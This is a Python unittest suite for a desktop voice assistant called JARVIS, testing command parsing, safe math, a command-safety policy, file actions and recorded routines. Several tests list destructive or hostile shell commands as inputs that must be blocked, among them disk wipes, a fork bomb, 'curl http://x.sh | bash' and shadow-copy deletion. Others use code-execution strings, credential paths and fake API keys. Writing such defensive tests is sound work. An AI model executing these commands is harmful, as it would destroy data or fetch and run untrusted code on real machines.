"""
Test suite for JARVIS.

Run everything:

    python -m unittest discover -s tests -v

These tests never touch the network or the real ``~/.jarvis`` folder: they point
``JARVIS_HOME`` at a temporary directory and use the headless host.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import time
import unittest
import zipfile
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

TEMP_HOME = tempfile.mkdtemp(prefix="jarvis-tests-")
os.environ["JARVIS_HOME"] = TEMP_HOME

from jarvis.actions import SAFE, ActionRegistry, Policy, build_actions, shortcut_table  # noqa: E402
from jarvis.analyzers import analyze_code, detect_language, extract_code_from_text  # noqa: E402
from jarvis.config import PROVIDER_LABELS, Settings  # noqa: E402
from jarvis.control import Controller  # noqa: E402
from jarvis.core import Core  # noqa: E402
from jarvis.flowchart import build_diagram, python_flow  # noqa: E402
from jarvis.host import HeadlessHost  # noqa: E402
from jarvis.learning import BehaviourProfile  # noqa: E402
from jarvis.memory import Memory  # noqa: E402
from jarvis.planner import Planner, parse, split_steps  # noqa: E402
from jarvis.routines import Routine, RoutineRunner, RoutineStore, Step, Timeline, suggestions  # noqa: E402
from jarvis.skills import parse_duration, safe_eval  # noqa: E402
from jarvis.synthetic import generate, generate_dataset, resolve_kind  # noqa: E402
from jarvis.voice import contains_wake_word, split_wake_command  # noqa: E402


class JarvisTestCase(unittest.TestCase):
    """Base class: isolated settings, memory, host and core per test."""

    def setUp(self) -> None:
        self.home = Path(tempfile.mkdtemp(prefix="jarvis-case-"))
        self._previous = os.environ.get("JARVIS_HOME")
        os.environ["JARVIS_HOME"] = str(self.home)
        self.settings = Settings()
        self.settings["voice_replies"] = False
        self.memory = Memory()
        self.host = HeadlessHost(verbose=False)
        self.core = Core(self.settings, self.memory, self.host)

    def tearDown(self) -> None:
        self.core.shutdown()
        if self._previous:
            os.environ["JARVIS_HOME"] = self._previous


class ParseChecks:
    """Shared “one sentence → one action call” assertion."""

    def check(self, utterance: str, expected: str, **args):
        parsed = parse(utterance)
        self.assertIsNotNone(parsed, f"nothing parsed for {utterance!r}")
        self.assertEqual(parsed[0], expected, f"{utterance!r} → {parsed}")
        for key, value in args.items():
            self.assertEqual(parsed[1].get(key), value, f"{utterance!r} → {parsed}")


class ControlTestCase(ParseChecks, JarvisTestCase):
    """Base class for computer-control tests.

    The sandbox these tests run in usually has no xdotool/Display, so everything
    is exercised through the **dry-run** backend: the real action code, policy,
    confirmation and audit paths all run, and only the final platform call is
    simulated. Nothing here can touch the machine it runs on.
    """

    def setUp(self) -> None:
        super().setUp()
        self.settings["dry_run"] = True
        self.host.confirm_answer = True          # approve by default in tests
        self.core = Core(self.settings, self.memory, self.host)
        self.registry = self.core.actions
        self.controller = self.core.controller
        self.store = self.core.routine_store
        self.timeline = self.core.timeline

    def use_real_files(self) -> None:
        """Switch the rehearsal off for tests that must touch a temp folder.

        ``dry_run`` is authoritative for file actions too (a rehearsal must not
        write to your disk), so a test that asserts on real bytes has to turn it
        off explicitly.
        """
        self.settings["dry_run"] = False
        self.core = Core(self.settings, self.memory, self.host)
        self.registry = self.core.actions
        self.controller = self.core.controller



# ════════════════════════════════════════════════════════════════════════════
class TestRouting(JarvisTestCase):
    def test_time(self):
        response = self.core.ask("what is the time")
        self.assertEqual(response.skill, "time")
        self.assertIn(":", response.text)

    def test_math_percentage(self):
        response = self.core.ask("what is 18% of 2400")
        self.assertEqual(response.skill, "math")
        self.assertIn("432", response.text)

    def test_math_expression(self):
        response = self.core.ask("calculate 12 * (7 + 5) / 4")
        self.assertEqual(response.skill, "math")
        self.assertIn("36", response.text)

    def test_unit_conversion(self):
        response = self.core.ask("convert 12 km to miles")
        self.assertEqual(response.skill, "math")
        self.assertIn("7.4", response.text)

    def test_help_beats_generic_skill(self):
        response = self.core.ask("what can you do with my clipboard")
        self.assertEqual(response.skill, "help")

    def test_identity(self):
        self.assertEqual(self.core.ask("who are you").skill, "identity")

    def test_offline_fallback_is_honest(self):
        # Offline mode is still a choice you can make, and it must never pretend
        # to have an answer it does not have.
        self.settings["provider"] = "offline"
        core = Core(self.settings, self.memory, self.host)
        response = core.ask("draft a legal contract for my startup")
        self.assertEqual(response.skill, "fallback")
        self.assertIn("/help", response.text)
        core.shutdown()

    def test_default_brain_is_a_free_cloud_model(self):
        from jarvis.config import DEFAULT_SETTINGS, FREE_LADDER, KEYLESS_PROVIDERS
        provider = DEFAULT_SETTINGS["provider"]
        self.assertIn(provider, FREE_LADDER, "the shipped default must be a free provider")
        self.assertIn(provider, KEYLESS_PROVIDERS, "the default must work with no API key")
        self.assertIn("free", PROVIDER_LABELS[provider].lower())
        brain = self.core.brain
        self.assertTrue(brain.enabled, "a model, not just the offline router, is the default")
        self.assertTrue(brain.ready, "the free default needs no key to be usable")
        self.assertIn("no key needed", brain.status())

    def test_brain_reports_free_ladder(self):
        ladder = self.core.brain.ladder()
        self.assertEqual(ladder[0], "pollinations")
        self.assertNotIn("offline", ladder, "offline is the router, not a model to try")

    def test_slash_commands(self):
        self.assertIn("JARVIS v", self.core.ask("/help").text)
        self.core.ask("hello there")
        self.assertTrue(self.memory.history)
        self.core.ask("/clear")
        self.assertFalse(self.memory.history)

    def test_unknown_slash_command(self):
        response = self.core.ask("/nonsense")
        self.assertFalse(response.ok)

    def test_wake_word_is_stripped(self):
        response = self.core.ask("Jarvis, what is the time")
        self.assertEqual(response.skill, "time")

    def test_skills_are_counted(self):
        self.assertGreaterEqual(len(self.core.registry.skills), 20)

    def test_every_skill_has_metadata_and_runs(self):
        """Each skill must match its own first example without raising."""
        for skill in self.core.registry.skills:
            self.assertTrue(skill.title, skill.name)
            self.assertTrue(skill.description, skill.name)
            if not skill.examples:
                continue
            example = skill.examples[0]
            with self.subTest(skill=skill.name):
                result = skill.run(example, self.core.ctx)
                self.assertIsInstance(result.text, str)


# ════════════════════════════════════════════════════════════════════════════
class TestMemorySkills(JarvisTestCase):
    def test_note_task_fact_roundtrip(self):
        self.core.ask("note that the staging database rotates on Monday")
        self.core.ask("add task Call the bank tomorrow")
        self.core.ask("remember my locker code is 4417")

        self.assertEqual(len(self.memory.notes), 1)
        self.assertIn("staging database", self.memory.notes[0].text)
        self.assertEqual(len(self.memory.open_tasks()), 1)
        self.assertEqual(self.memory.recall("locker code"), "4417")

        listed = self.core.ask("what are my tasks")
        self.assertIn("Call the bank", listed.text)
        recalled = self.core.ask("what do you remember about my locker code")
        self.assertIn("4417", recalled.text)

    def test_memory_persists_to_disk(self):
        self.core.ask("remember my project is called Code-Jarvis")
        reloaded = Memory()
        self.assertEqual(reloaded.recall("project"), "Code-Jarvis")

    def test_complete_task(self):
        self.core.ask("add task water the plants")
        self.core.ask("complete task water the plants")
        self.assertEqual(len(self.memory.open_tasks()), 0)

    def test_window_title_fact_does_not_override_notes(self):
        """'write down' style phrasing must still create a note."""
        self.core.ask("write down buy milk on the way home")
        self.assertTrue(self.memory.notes)


class TestTimers(JarvisTestCase):
    def test_timer_fires_notification(self):
        response = self.core.ask("set a timer for 1 second to stretch")
        self.assertEqual(response.skill, "timer")
        time.sleep(1.6)
        titles = [title for title, _text, _level in self.host.notifications]
        self.assertIn("JARVIS reminder", titles)
        self.assertTrue(any("stretch" in text for text in self.host.spoken))

    def test_timer_listing(self):
        self.core.ask("set a timer for 30 seconds")
        listing = self.core.ask("list timers")
        self.assertIn("left", listing.text)


# ════════════════════════════════════════════════════════════════════════════
class TestClipboardCodeReview(JarvisTestCase):
    """The flagship workflow: review whatever is on the clipboard."""

    SNIPPET = (
        "import os\n"
        "API_KEY = 'sk-abcdefghijklmnopqrstuvwxyz012345'\n"
        "def load(items=[], path=None):\n"
        "    if path == None:\n"
        "        path = []\n"
        "    os.system('cat ' + str(path))\n"
        "    return path[:100]\n"
    )

    def test_review_finds_planted_issues(self):
        self.host.set_clipboard(self.SNIPPET)
        response = self.core.ask("review my clipboard")
        self.assertEqual(response.skill, "code_review")
        self.assertEqual(response.data["report"]["language"], "Python")
        rules = {finding["rule"] for finding in response.data["report"]["findings"]}
        self.assertIn("secret", rules)
        self.assertIn("shell-injection", rules)
        self.assertIn("ast-eq-none", rules)
        self.assertIn("ast-mutable-default", rules)
        self.assertIn("critical", response.text.lower())

    def test_review_reports_empty_clipboard_clearly(self):
        self.host.set_clipboard("")
        response = self.core.ask("review my clipboard")
        self.assertFalse(response.ok)
        self.assertIn("empty", response.text.lower())

    def test_flowchart_from_clipboard(self):
        self.host.set_clipboard("def pick(items):\n    for i in items:\n        if i:\n            return i\n")
        response = self.core.ask("make a flowchart of my clipboard")
        self.assertEqual(response.skill, "flowchart")
        self.assertIn("flowchart TD", response.data["mermaid"])


class TestAnalyzers(unittest.TestCase):
    def test_language_detection(self):
        self.assertEqual(detect_language("def f(x):\n    return x\n"), "Python")
        self.assertEqual(detect_language("SELECT * FROM users;"), "SQL")
        self.assertEqual(detect_language('{"a": 1}'), "JSON")
        self.assertEqual(detect_language("#include <stdio.h>"), "C/C++")
        self.assertEqual(detect_language("", "main.rs"), "Rust")

    def test_secrets_and_unsafe_calls(self):
        code = '''
import os
API_KEY = "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"
def run(user=[], n=None):
    try:
        os.system("ls " + str(n))
    except:
        pass
    if n == None:
        eval("1+1")
'''
        report = analyze_code(code, filename="demo.py")
        rules = {finding.rule for finding in report.findings}
        self.assertIn("secret", rules)
        self.assertIn("shell-injection", rules)
        self.assertIn("ast-bare-except", rules)
        self.assertIn("ast-eval", rules)
        self.assertIn("ast-mutable-default", rules)
        self.assertEqual(report.worst, "critical")
        self.assertFalse(report.parsed is False)  # valid Python still parses

    def test_syntax_error_is_reported(self):
        report = analyze_code("def broken(:\n    pass\n")
        self.assertFalse(report.parsed)
        self.assertTrue(report.parse_error)
        self.assertEqual(report.counts()["critical"], 1)

    def test_clean_code_has_no_criticals(self):
        report = analyze_code("def add(a: int, b: int) -> int:\n    return a + b\n")
        self.assertEqual(report.counts()["critical"], 0)

    def test_metrics_and_markdown(self):
        report = analyze_code("def f():\n    return 1\n\ndef g():\n    return 2\n")
        self.assertEqual(report.metrics.get("functions"), 2)
        self.assertIn("Code review", report.to_markdown())

    def test_extract_fenced_block(self):
        text = "please check\n```python\nprint('hi')\n```\nthanks"
        self.assertEqual(extract_code_from_text(text).strip(), "print('hi')")


class TestSyntheticData(unittest.TestCase):
    def test_resolve_kind(self):
        self.assertEqual(resolve_kind("patient health records"), "health")
        self.assertEqual(resolve_kind("payments"), "transactions")
        self.assertIsNone(resolve_kind("kittens"))

    def test_generation_is_deterministic(self):
        first, _ = generate_dataset("users", rows=25, seed=7)
        second, _ = generate_dataset("users", rows=25, seed=7)
        third, _ = generate_dataset("users", rows=25, seed=8)
        self.assertEqual(first, second)
        self.assertNotEqual(first, third)

    def test_files_are_written(self):
        for fmt in ("csv", "json", "jsonl", "sql"):
            with self.subTest(fmt=fmt):
                result = generate("logs", rows=10, seed=1, fmt=fmt)
                path = Path(result["path"])
                self.assertTrue(path.exists())
                self.assertGreater(path.stat().st_size, 20)

    def test_unknown_kind_raises(self):
        with self.assertRaises(KeyError):
            generate_dataset("dragons", rows=1)


class TestFlowchart(unittest.TestCase):
    def test_python_flow_has_decision_and_loop(self):
        code = """
def check(items):
    for item in items:
        if item > 10:
            return "big"
        else:
            print(item)
    return "none"
"""
        mermaid, dot, nodes = python_flow(code, "check")
        self.assertIn("flowchart TD", mermaid)
        self.assertIn("-->", mermaid)
        self.assertIn("digraph flow", dot)
        self.assertGreater(nodes, 3)

    def test_syntax_error_raises_value_error(self):
        with self.assertRaises(ValueError):
            python_flow("def broken(:\n  pass")

    def test_build_diagram_writes_files(self):
        diagram = build_diagram("x = 1\nif x:\n    print(x)\n", title="tiny", render_png=False)
        self.assertIn("mermaid", diagram.paths)
        self.assertTrue(Path(diagram.paths["mermaid"]).exists())


class TestVoiceHelpers(unittest.TestCase):
    def test_wake_word_matching(self):
        self.assertTrue(contains_wake_word("jarvis are you there"))
        self.assertTrue(contains_wake_word("Hey Jarvis, weather"))
        self.assertTrue(contains_wake_word("jarvus what time is it"))  # tolerance for accents
        self.assertFalse(contains_wake_word("the service is down"))

    def test_split_wake_command(self):
        self.assertEqual(split_wake_command("jarvis set a timer", "jarvis"), "set a timer")
        self.assertEqual(split_wake_command("hey jarvis, weather in chennai", "jarvis"), "weather in chennai")
        self.assertEqual(split_wake_command("no wake word here", "jarvis"), "")


class TestSafeMath(unittest.TestCase):
    def test_allows_arithmetic(self):
        self.assertEqual(safe_eval("2 + 3 * 4"), 14)
        self.assertEqual(safe_eval("sqrt(81)"), 9)

    def test_blocks_code_execution(self):
        for expression in ("__import__('os').system('echo hi')", "open('/etc/passwd')", "1 if True else 2"):
            with self.subTest(expression=expression):
                with self.assertRaises(ValueError):
                    safe_eval(expression)

    def test_duration_parsing(self):
        self.assertEqual(parse_duration("in 10 minutes"), 600)
        self.assertEqual(parse_duration("timer for 1 hour 30 minutes"), 5400)
        self.assertEqual(parse_duration("45 seconds"), 45)
        self.assertIsNone(parse_duration("later"))


class TestSettings(JarvisTestCase):
    def test_defaults_and_roundtrip(self):
        self.settings["city"] = "Chennai"
        self.settings.save()
        self.assertEqual(Settings()["city"], "Chennai")

    def test_api_key_from_environment_wins(self):
        os.environ["GROQ_API_KEY"] = "env-key-value"
        try:
            self.settings.set_api_key("groq", "stored-key")
            self.assertEqual(self.settings.api_key("groq"), "env-key-value")
            self.assertIn("env", self.settings.key_source("groq"))
        finally:
            os.environ.pop("GROQ_API_KEY", None)
        self.assertEqual(self.settings.api_key("groq"), "stored-key")

    def test_settings_file_permissions(self):
        self.settings.set_api_key("openai", "sk-test-value")
        self.settings.save()
        mode = oct(self.settings.path.stat().st_mode)[-3:]
        if sys.platform != "win32":
            self.assertIn(mode, {"600", "640", "660"})

    def test_missing_key_is_reported_clearly(self):
        # A keyed provider without a key must say so — and the free ladder must
        # still be offered rather than failing silently.
        self.settings["provider"] = "groq"
        self.settings["free_fallback"] = False
        self.settings.set_api_key("groq", "")
        self.assertFalse(self.core.brain.ready)
        self.assertIn("no key", self.core.brain.status())
        self.assertIn("GROQ_API_KEY", self.core.brain.status())
        response = self.core.ask("tell me a story")
        self.assertFalse(response.ok)
        self.assertIn("No provider is available", response.text)

    def test_keyed_provider_leads_the_ladder_once_it_has_a_key(self):
        self.settings.set_api_key("groq", "gsk_not_a_real_key_000000000000")
        self.settings["provider"] = "groq"
        ladder = self.core.brain.ladder()
        self.assertEqual(ladder[0], "groq")
        self.assertIn("pollinations", ladder, "the free default stays as a safety net")


class TestHostContract(JarvisTestCase):
    def test_clipboard_roundtrip(self):
        self.assertTrue(self.host.set_clipboard("hello jarvis"))
        self.assertEqual(self.host.get_clipboard(), "hello jarvis")

    def test_notifications_and_logging(self):
        self.host.notify("Test", "body", "alarm")
        self.host.log("something happened")
        self.assertEqual(self.host.notifications[0][2], "alarm")
        self.assertTrue(self.host.logs)

    def test_schedule_and_cancel(self):
        flag: list[bool] = []
        self.host.schedule(0.1, lambda: flag.append(True))
        time.sleep(0.25)
        self.assertTrue(flag)
        handle2 = self.host.schedule(5.0, lambda: flag.append(False))
        self.assertTrue(self.host.cancel_schedule(handle2))


class TestClipping(unittest.TestCase):
    """JSON/CSV output must stay machine-readable."""

    def test_synthetic_json_is_valid(self):
        result = generate("sensors", rows=5, seed=3, fmt="json")
        data = json.loads(Path(result["path"]).read_text())
        self.assertEqual(len(data), 5)
        self.assertIn("temperature_c", data[0])


if __name__ == "__main__":
    unittest.main(verbosity=2)


# ════════════════════════════════════════════════════════════════════════════
#  Computer control: parsing
# ════════════════════════════════════════════════════════════════════════════

class TestPlannerParsing(ParseChecks, unittest.TestCase):
    """The offline grammar: what people say → what JARVIS does."""

    def test_apps_and_windows(self):
        self.check("open chrome", "open_app", target="chrome")
        self.check("launch my editor", "open_app", target="editor")
        self.check("open https://example.com", "open_url", url="https://example.com")
        self.check("switch to code", "focus_window", title="code")
        self.check("close notepad", "close_window", title="notepad")
        self.check("minimise spotify", "minimize_window", title="spotify")
        self.check("switch windows", "switch_window")

    def test_audio_and_display(self):
        self.check("set the volume to 30", "set_volume", level=30)
        self.check("volume 65", "set_volume", level=65)
        self.check("volume down 15", "nudge_volume", delta=-15)
        self.check("mute", "mute_control", action="on")
        self.check("unmute", "mute_control", action="off")
        self.check("set brightness to 40", "set_brightness", level=40)
        self.check("dim the screen", "set_brightness", level=25)

    def test_keyboard_and_mouse(self):
        self.check("press ctrl+s", "press_keys", keys="ctrl+s")
        self.check("hit control shift t", "press_keys", keys="ctrl+shift+t")
        self.check("type hello world", "type_text", text="hello world")
        self.check("double click", "click", clicks=2)
        self.check("right click", "click", button="right")
        self.check("scroll down 5", "scroll", amount=-5)
        self.check("move the mouse to 100, 200", "move_mouse", x=100, y=200)

    def test_power_and_shell(self):
        self.check("lock my screen", "power", action="lock")
        self.check("shut down", "power", action="shutdown")
        self.check("restart the computer", "power", action="restart")
        self.check("run the command ls -la", "run_command", command="ls -la")
        self.check("kill spotify", "kill_process", target="spotify")

    def test_files_and_screen(self):
        self.check("copy ~/a.txt to ~/b.txt", "copy_path", source="~/a.txt", destination="~/b.txt")
        self.check("rename report.md to final.md", "rename_path", path="report.md", name="final.md")
        self.check("delete ~/junk.txt", "delete_path", path="~/junk.txt")
        self.check("zip ~/Downloads to ~/backup", "zip_path", source="~/Downloads",
                   destination="~/backup")
        self.check("create folder ~/projects", "make_dir", path="~/projects")
        self.check("read my screen", "read_screen")
        self.check("take a screenshot", "screenshot")

    def test_clipboard_and_assistant(self):
        self.check("read my clipboard", "clipboard_read")
        self.check("copy hello world to my clipboard", "clipboard_write", text="hello world")
        self.check("notify me that the build finished", "notify", text="the build finished")
        self.check("wait 3", "wait", seconds=3)

    def test_unknown_phrases_do_not_parse(self):
        for text in ("what is the weather", "tell me a joke", "", "   ", "asdfgh"):
            self.assertIsNone(parse(text), f"{text!r} should not parse to an action")

    def test_split_steps(self):
        self.assertEqual(split_steps("open chrome then set volume to 20"),
                         ["open chrome", "set volume to 20"])
        self.assertEqual(len(split_steps("open chrome, then mute and then lock my screen")), 3)
        self.assertEqual(len(split_steps("step 1 open chrome step 2 mute")), 2)
        self.assertEqual(split_steps("open chrome"), ["open chrome"])


class TestPlans(unittest.TestCase):
    """Multi-step plans, including the language-model fallback."""

    def setUp(self) -> None:
        os.environ["JARVIS_HOME"] = tempfile.mkdtemp(prefix="jarvis-plan-")
        settings = Settings()
        settings["dry_run"] = True
        self.settings = settings
        self.host = HeadlessHost(verbose=False)
        self.host.confirm_answer = True
        self.memory = Memory()
        self.controller = Controller(settings)
        self.registry = ActionRegistry(settings, self.memory, self.host, self.controller)

    def test_plan_parses_every_clause(self):
        planner = Planner(self.registry)
        plan = planner.plan("open chrome, then set the volume to 20 and then read my screen")
        self.assertEqual(len(plan.steps), 3)
        self.assertTrue(plan.complete)
        self.assertEqual([step.action for step in plan.steps],
                         ["open_app", "set_volume", "read_screen"])

    def test_plan_reports_what_it_did_not_understand(self):
        planner = Planner(self.registry)
        plan = planner.plan("open chrome then invent a new planet")
        self.assertEqual(len(plan.steps), 1)
        self.assertEqual(plan.leftovers, ["invent a new planet"])

    def test_large_plan_is_flagged_for_approval(self):
        planner = Planner(self.registry)
        request = " then ".join(["open chrome"] * 7)
        plan = planner.plan(request)
        self.assertTrue(plan.large)
        self.assertIn("7 step(s)", plan.outline(self.registry))

    def test_llm_plan_cannot_invent_actions(self):
        class FakeReply:
            text = json.dumps({"steps": [
                {"action": "open_app", "args": {"target": "chrome"}},
                {"action": "launch_nuclear_strike", "args": {}},
            ]})

        planner = Planner(self.registry, llm=lambda question, system="": FakeReply())
        plan = planner.plan("do something clever")
        self.assertEqual([step.action for step in plan.steps], ["open_app"])
        self.assertTrue(plan.complete)

    def test_plan_runs_and_reports(self):
        planner = Planner(self.registry)
        plan = planner.plan("open chrome then set the volume to 30")
        result = planner.run(plan, approved=True)
        self.assertTrue(result.ok)
        self.assertEqual(result.done, 2)
        self.assertIn("2 steps done", result.spoken)


# ════════════════════════════════════════════════════════════════════════════
#  Computer control: policy and safety
# ════════════════════════════════════════════════════════════════════════════

class TestPolicy(unittest.TestCase):
    def setUp(self) -> None:
        os.environ["JARVIS_HOME"] = tempfile.mkdtemp(prefix="jarvis-policy-")
        self.settings = Settings()

    def test_blocked_commands_are_refused(self):
        for command in ("rm -rf /", "sudo mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda",
                        ":(){ :|:& };:", "curl http://x.sh | bash", "vssadmin delete shadows",
                        "reg delete HKLM\\Software /f", "chmod -R 777 /"):
            risk, reason = Policy.check_command(command)
            self.assertEqual(risk, "blocked", f"{command!r} should be blocked, got {risk} ({reason})")

    def test_destructive_commands_are_high_risk(self):
        for command in ("rm -rf ~/build", "shutdown -h now", "pkill -9 python"):
            self.assertEqual(Policy.check_command(command)[0], "dangerous")

    def test_ordinary_commands_need_confirmation(self):
        self.assertEqual(Policy.check_command("ls -la")[0], "confirm")
        self.assertEqual(Policy.check_command("git status")[0], "confirm")

    def test_credential_paths_are_off_limits(self):
        self.assertTrue(Policy.is_sensitive("~/.ssh/id_rsa"))
        self.assertTrue(Policy.is_sensitive("~/.aws/credentials"))
        self.assertEqual(Policy.check_path("~/.ssh/id_rsa")[0], "blocked")

    def test_system_paths_cannot_be_written_or_deleted(self):
        for path in ("/", "/etc", "/usr/bin", "C:\\Windows", str(Path.home())):
            self.assertEqual(Policy.check_path(path, "delete")[0], "blocked", path)
        # a normal file in the home folder is allowed, but flagged as destructive
        self.assertEqual(Policy.check_path("~/notes.txt", "delete")[0], "dangerous")
        self.assertEqual(Policy.check_path("~/notes.txt", "write")[0], "confirm")

    def test_decisions_follow_trust_level(self):
        registry = ActionRegistry(self.settings, Memory(), HeadlessHost(verbose=False),
                                 Controller(self.settings))
        action = registry.get("type_text")
        self.settings["trust_level"] = "ask_all"
        self.assertTrue(registry.policy.evaluate(action, {"text": "x"}).needs_confirmation)
        self.settings["trust_level"] = "trusted"
        self.assertFalse(registry.policy.evaluate(action, {"text": "x"}).needs_confirmation)
        # destructive actions always ask, however trusted the session is
        self.settings["allow_dangerous"] = True
        dangerous = registry.policy.evaluate(registry.get("kill_process"), {"target": "chrome"})
        self.assertTrue(dangerous.needs_confirmation)

    def test_destructive_actions_are_off_by_default(self):
        registry = ActionRegistry(self.settings, Memory(), HeadlessHost(verbose=False),
                                 Controller(self.settings))
        decision = registry.policy.evaluate(registry.get("delete_path"), {"path": "~/x.txt"})
        self.assertFalse(decision.allowed)
        self.assertIn("Allow destructive", decision.reason)


# ════════════════════════════════════════════════════════════════════════════
#  Computer control: actions, audit, confirmations
# ════════════════════════════════════════════════════════════════════════════

class TestControlActions(ControlTestCase):
    def test_actions_run_in_dry_run_and_are_audited(self):
        result = self.registry.execute("set_volume", {"level": 25})
        self.assertTrue(result.ok)
        self.assertTrue(result.simulated)
        entries = self.core.audit.tail(3)
        self.assertEqual(entries[-1]["action"], "set_volume")
        self.assertEqual(entries[-1]["outcome"], "auto")
        self.assertEqual(entries[-1]["args"]["level"], 25)

    def test_refused_actions_are_logged_and_never_run(self):
        result = self.registry.execute("run_command", {"command": "rm -rf /"})
        self.assertFalse(result.ok)
        self.assertIn("refused", result.message.lower())
        self.assertEqual(self.core.audit.tail(1)[-1]["outcome"], "refused")

    def test_confirmation_can_be_declined(self):
        self.host.confirm_answer = False
        result = self.registry.execute("type_text", {"text": "hello"})
        self.assertFalse(result.ok)
        self.assertIn("Cancelled", result.message)
        self.assertEqual(self.core.audit.tail(1)[-1]["outcome"], "declined")

    def test_voice_confirmation_yes_runs_the_action(self):
        self.settings["voice_confirm"] = True
        self.core.actions.voice_confirm = True
        asked = self.core.ask("open chrome")
        self.assertIn("Say “yes”", asked.text)
        self.assertIsNotNone(self.core.actions.pending)
        confirmed = self.core.ask("yes")
        self.assertTrue(confirmed.ok)
        self.assertIsNone(self.core.actions.pending)
        self.assertIn("open_app", [entry["action"] for entry in self.core.audit.tail(3)])

    def test_voice_confirmation_no_cancels(self):
        self.settings["voice_confirm"] = True
        self.core.actions.voice_confirm = True
        self.core.ask("open chrome")
        cancelled = self.core.ask("no")
        self.assertIn("Cancelled", cancelled.text)
        self.assertIsNone(self.core.actions.pending)

    def test_a_new_request_drops_a_pending_action(self):
        self.settings["voice_confirm"] = True
        self.core.actions.voice_confirm = True
        self.core.ask("open chrome")
        self.core.ask("what is the time")
        self.assertIsNone(self.core.actions.pending)

    def test_capabilities_report_is_honest(self):
        report = self.controller.report()
        self.assertIn(report.backend, {"null", "linux", "windows", "macos", "dry-run", "simulation"})
        text = self.controller.report_text()
        self.assertIn("Computer control", text)
        self.assertIn("simulated", text)

    def test_help_and_history_skills_answer(self):
        response = self.core.ask("what can you control")
        self.assertTrue(response.ok)
        self.assertEqual(response.skill, "control")
        self.assertIn("Available actions", response.text)
        self.core.ask("set the volume to 10")
        history = self.core.ask("show the action log")
        self.assertIn("set_volume", history.text)


class TestFileActions(ControlTestCase):
    """Real file operations, in a throw-away folder."""

    def setUp(self) -> None:
        super().setUp()
        self.use_real_files()
        self.workspace = Path(tempfile.mkdtemp(prefix="jarvis-files-"))
        self.source = self.workspace / "notes.txt"
        self.source.write_text("hello", encoding="utf-8")

    def test_write_and_list(self):
        target = self.workspace / "sub" / "todo.md"
        result = self.registry.execute("write_file", {"path": str(target), "content": "- ship it"})
        self.assertTrue(result.ok)
        self.assertEqual(target.read_text(encoding="utf-8"), "- ship it")
        listing = self.registry.execute("list_dir", {"path": str(self.workspace)})
        self.assertIn("notes.txt", listing.message)
        self.assertIn("sub", listing.message)

    def test_copy_move_and_zip(self):
        copy = self.registry.execute("copy_path", {"source": str(self.source),
                                                  "destination": str(self.workspace / "copy.txt")})
        self.assertTrue(copy.ok)
        moved = self.registry.execute("move_path", {"source": str(self.workspace / "copy.txt"),
                                                    "destination": str(self.workspace / "renamed.txt")})
        self.assertTrue(moved.ok)
        self.assertFalse((self.workspace / "copy.txt").exists())
        archive = self.registry.execute("zip_path", {"source": str(self.workspace / "renamed.txt")})
        self.assertTrue(archive.ok)
        self.assertTrue((self.workspace / "renamed.zip").exists())

    def test_make_dir_then_delete_requires_permission(self):
        folder = self.workspace / "new"
        self.assertTrue(self.registry.execute("make_dir", {"path": str(folder)}).ok)
        blocked = self.registry.execute("delete_path", {"path": str(folder)})
        self.assertFalse(blocked.ok)                 # destructive actions are off by default
        self.settings["allow_dangerous"] = True
        self.registry = ActionRegistry(self.settings, self.memory, self.host, self.controller)
        allowed = self.registry.execute("delete_path", {"path": str(folder)})
        self.assertTrue(allowed.ok)
        self.assertFalse(folder.exists())

    def test_the_rehearsal_never_touches_the_disk(self):
        """A dry run reports what it *would* do — it must not do it."""
        self.settings["dry_run"] = True
        registry = ActionRegistry(self.settings, self.memory, self.host, Controller(self.settings))
        target = self.workspace / "rehearsal.txt"
        result = registry.execute("write_file", {"path": str(target), "content": "nope"})
        self.assertTrue(result.ok)
        self.assertIn("[simulation]", result.message)
        self.assertFalse(target.exists())

        folder = self.workspace / "rehearsal-dir"
        self.assertIn("[simulation]", registry.execute("make_dir", {"path": str(folder)}).message)
        self.assertIn("[simulation]",
                      registry.execute("zip_path", {"source": str(self.source)}).message)
        self.assertFalse(folder.exists())
        self.assertFalse((self.workspace / "notes.zip").exists())
        self.assertEqual(self.source.read_text(encoding="utf-8"), "hello")

    def test_sensitive_path_is_refused(self):
        result = self.registry.execute("write_file", {"path": "~/.ssh/authorized_keys",
                                                      "content": "x"})
        self.assertFalse(result.ok)
        self.assertIn("credential", result.message)


# ════════════════════════════════════════════════════════════════════════════
#  Routines: recording, remembering, replaying
# ════════════════════════════════════════════════════════════════════════════

class TestRecordingAndReplay(ControlTestCase):
    def test_record_save_and_run_a_routine(self):
        started = self.core.ask("watch what I do")
        self.assertTrue(started.ok)
        self.assertTrue(self.core.recorder.active)

        for step in ("open chrome", "set the volume to 20", "notify me that work is starting"):
            self.assertTrue(self.core.ask(step).ok, step)

        saved = self.core.ask("save that as work session")
        self.assertTrue(saved.ok, saved.text)
        self.assertIn("work session", saved.text)
        self.assertFalse(self.core.recorder.active)

        # it is *in memory* — the same place notes and facts live
        self.assertIn("routine.work session", self.memory.facts)
        reloaded = Memory()
        self.assertEqual(len(reloaded.facts.get("routine.work session", "")), len(
            self.memory.facts["routine.work session"]))
        self.assertEqual(len(RoutineStore(reloaded).all()), 1)
        self.assertEqual(RoutineStore(reloaded).get("work session").steps[0].action, "open_app")

        run = self.core.ask("run my work session")
        self.assertTrue(run.ok, run.text)
        self.assertIn("3 steps completed", run.text)
        self.assertEqual(self.store.get("work session").times_run, 1)

    def test_routine_survives_a_restart(self):
        self.core.ask("watch what I do")
        self.core.ask("open chrome")
        self.core.ask("save that as morning")
        # a brand-new core, as if JARVIS had been restarted
        fresh_host = HeadlessHost(verbose=False)
        fresh_host.confirm_answer = True
        fresh = Core(self.settings, Memory(), fresh_host)
        self.assertIn("morning", fresh.routine_store.names())
        result = fresh.ask("run my morning")
        self.assertTrue(result.ok)
        self.assertEqual(fresh.routine_store.get("morning").times_run, 1)

    def test_recording_can_be_cancelled_and_undone(self):
        self.core.ask("watch what I do")
        self.core.ask("open chrome")
        self.core.ask("open spotify")
        undone = self.core.ask("undo last step")
        self.assertIn("Dropped", undone.text)
        self.assertEqual(len(self.core.recorder.steps), 1)
        self.core.ask("cancel recording")
        self.assertFalse(self.core.recorder.active)
        self.assertEqual(self.core.recorder.steps, [])
        self.assertIn("nothing recorded", self.core.ask("save that as ghost").text.lower())

    def test_list_and_delete_routines(self):
        self.core.ask("watch what I do")
        self.core.ask("open chrome")
        self.core.ask("save that as focus")
        listing = self.core.ask("what routines do I have")
        self.assertIn("focus", listing.text)
